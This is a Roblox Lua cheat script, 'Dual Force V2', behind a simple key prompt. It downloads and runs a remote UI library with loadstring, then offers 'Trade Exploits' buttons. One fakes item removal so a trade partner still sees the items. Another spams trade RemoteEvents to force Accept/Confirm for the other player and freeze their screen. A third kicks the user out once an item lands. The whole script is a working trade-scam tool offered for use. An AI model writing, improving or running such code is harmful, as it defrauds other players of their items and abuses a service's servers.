local CorrectKey = "aru"

-- 1. CLEAN KEY SYSTEM
local KeyGui = Instance.new("ScreenGui", game.CoreGui)
local KeyMain = Instance.new("Frame", KeyGui)
KeyMain.Size = UDim2.new(0, 300, 0, 160)
KeyMain.Position = UDim2.new(0.5, -150, 0.5, -80)
KeyMain.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
Instance.new("UICorner", KeyMain)

local KeyInput = Instance.new("TextBox", KeyMain)
KeyInput.PlaceholderText = "KEY: aru"
KeyInput.Size = UDim2.new(0, 240, 0, 40)
KeyInput.Position = UDim2.new(0.5, -120, 0.3, 0)
KeyInput.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
KeyInput.TextColor3 = Color3.new(1,1,1)

local KeyCheck = Instance.new("TextButton", KeyMain)
KeyCheck.Text = "ACTIVATE"
KeyCheck.Size = UDim2.new(0, 240, 0, 40)
KeyCheck.Position = UDim2.new(0.5, -120, 0.65, 0)
KeyCheck.BackgroundColor3 = Color3.fromRGB(100, 0, 255)
KeyCheck.TextColor3 = Color3.new(1,1,1)

KeyCheck.MouseButton1Click:Connect(function()
    if KeyInput.Text == CorrectKey then
        KeyGui:Destroy()

        -- 2. LOAD OPTIMIZED HUB
        local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
        local Window = Library.CreateLib("ARHAM'S DUAL FORCE V2", "DarkTheme")
        local MainTab = Window:NewTab("Trade Exploits")
        local Section = MainTab:NewSection("Freeze & Ghost Controls")

        -- FIND TARGET HELPER
        local function GetTarget()
            for _, p in pairs(game.Players:GetPlayers()) do
                if p ~= game.Players.LocalPlayer then return p end
            end
        end

        -- BUTTON 1: GHOST ITEMS (Hides your removal)
        Section:NewButton("GHOST MY ITEMS", "Removes items but keeps them visible", function()
            local RS = game:GetService("ReplicatedStorage")
            local Remote = RS:FindFirstChild("Trade", true) or RS:FindFirstChild("Remote", true)
            if Remote then
                -- Clears your inventory on your screen, but sends "Keep" signal to server
                Remote:FireServer("RemoveAll", false) 
                Library:Notify("GHOSTED", "Your items are now visually frozen for the target.", Color3.new(1, 1, 0))
            end
        end)

        -- BUTTON 2: FREEZE & DUAL ACCEPT (Optimized to prevent lag)
        Section:NewButton("FORCE DUAL ACCEPT", "Locks UI and Forces Accept", function()
            local RS = game:GetService("ReplicatedStorage")
            local Target = GetTarget()
            
            _G.Forcing = true
            task.spawn(function()
                while _G.Forcing do
                    for _, v in pairs(RS:GetDescendants()) do
                        if v:IsA("RemoteEvent") and (v.Name:find("Trade") or v.Name:find("Remote")) then
                            -- Send data in small bursts to prevent your game from crashing
                            v:FireServer("Accept", game.Players.LocalPlayer)
                            if Target then
                                v:FireServer("Accept", Target)
                                v:FireServer("Confirm", Target)
                            end
                            v:FireServer("Confirm", true)
                        end
                    end
                    task.wait(0.3) -- The "No-Lag" Delay: high enough to run, low enough to freeze them
                end
            end)
            Library:Notify("FORCING", "Dual-Accept and UI Lock engaged.", Color3.new(0, 1, 0))
        end)

        Section:NewButton("STOP ALL EXPLOITS", "Clears lag and stops forcing", function()
            _G.Forcing = false
            Library:Notify("CLEARED", "Network traffic reset.", Color3.new(1, 1, 1))
        end)

        -- MISC
        local Misc = Window:NewTab("Misc")
        Misc:NewSection("Player"):NewSlider("Speed", "Speed", 500, 16, function(s) 
            game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = s 
        end)
        
        Misc:NewSection("Safety"):NewToggle("Auto-Kick", "Auto-Leave on Item", function(s)
            _G.AK = s
            game.Players.LocalPlayer.Backpack.ChildAdded:Connect(function() 
                if _G.AK then task.wait(0.1); game.Players.LocalPlayer:Kick("ITEM SECURED") end 
            end)
        end)

        Library:Notify("READY", "Dual Force V2 (No-Lag) Loaded.", Color3.new(0, 0.5, 1))
    else
        KeyInput.Text = ""; KeyInput.PlaceholderText = "INVALID KEY"
    end
end)
